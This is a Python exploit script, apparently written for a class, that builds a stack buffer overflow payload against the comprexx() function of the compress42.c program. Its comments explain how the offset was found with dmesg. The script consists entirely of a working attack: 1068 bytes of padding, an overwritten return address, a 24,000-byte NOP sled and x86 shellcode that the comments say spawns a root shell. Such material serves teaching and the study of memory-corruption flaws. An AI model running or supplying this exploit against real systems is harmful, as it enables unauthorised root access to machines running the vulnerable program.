import sys
import struct

# Pattern: [junk data][return address][NOP sled][shellcode]

# Payload initialized as empty (and always specified as b (bytes)):
payload = b""

# Junk data to overflow the buffer and reach the position of the return address.
# The comprexx() function inside the source program (compress42.c) sets a local buffer of chars (tempname) of MAXPATHLEN size, which is #defined as 1024,
# so we need at least 1024 bytes of junk data to reach the return address.
# After testing, we increase the junk data (1024++) until we get a segmentation fault.
# And as soon as we get a segfault, we do a sudo dmesg | tail -3 to see the IP (Instruction Pointer) value at the point of the segfault.
# If the IP is not 41414141 (AAAA), we need to increase the junk data until we get a segfault with the IP being 41414141.
# We then know which is the exact position of the return address, so we decrease the junk data by 4 bytes,
# so that we can concat as the next element of the payload our own "return address".
# After testing, 1072 A's is the minimum to reach the return address, so 1072 - 4 = 1068.
payload += b"A" * 1068

# Here is the position of the return address, we will overwrite it with an address inside the NOP sled.
# At the above steps, at the point of the segmentation fault, we keep the value of SP (Stack Pointer) too.
# This is useful because we can use SP as a reference point to find our return address that will point into the NOP sled.
# Putting that SP value + an offset, we can increase the chances of the return address to point into the NOP sled,
# (in my machine it works with just the address and no offset, but to be sure it will work in any machine it runs (maybe with 
# variant number and size of environment variables, etc), an offset is necessary to increase the posibilities it works).
# Here I use 12000 as an offset (it is 1/2 of the NOPS i will concatenate afterwards).
payload += struct.pack("<I", 0xffff7fb0 + 12000)

# Now it is time to add the NOP sled. I add 24000 NOPS so that our "target" is more likely to be hit.
payload += b"\x90" * 24000

# Finally, I add the actual shellcode that will be executed.
# This is the one we used in class, and it simply execs a shell as root. 
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# Write the payload to stdout
sys.stdout.buffer.write(payload)
